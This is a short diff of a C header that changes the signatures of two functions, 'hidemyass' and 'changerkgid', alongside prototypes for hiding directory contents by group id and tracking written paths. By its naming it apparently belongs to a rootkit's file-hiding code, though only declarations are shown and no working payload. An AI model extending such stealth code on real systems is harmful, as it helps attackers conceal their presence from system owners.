@@ -4,7 +4,7 @@ int gidtaken(gid_t newgid);
 #ifdef HIDE_MY_ASS
 int pathtracked(const char *pathname);
 void trackwrite(const char *pathname);
-void hidemyass(void);
+void hidemyass(gid_t oldgid);
 #endif
 
 gid_t readgid(void);
@@ -15,7 +15,7 @@ gid_t readgid(void);
 
 #ifdef READ_GID_FROM_FILE
 void hidedircontents(const char *path, gid_t newgid);
-gid_t changerkgid(void);
+gid_t changerkgid(int curtime);
 #include "change.c"
 #endif
 
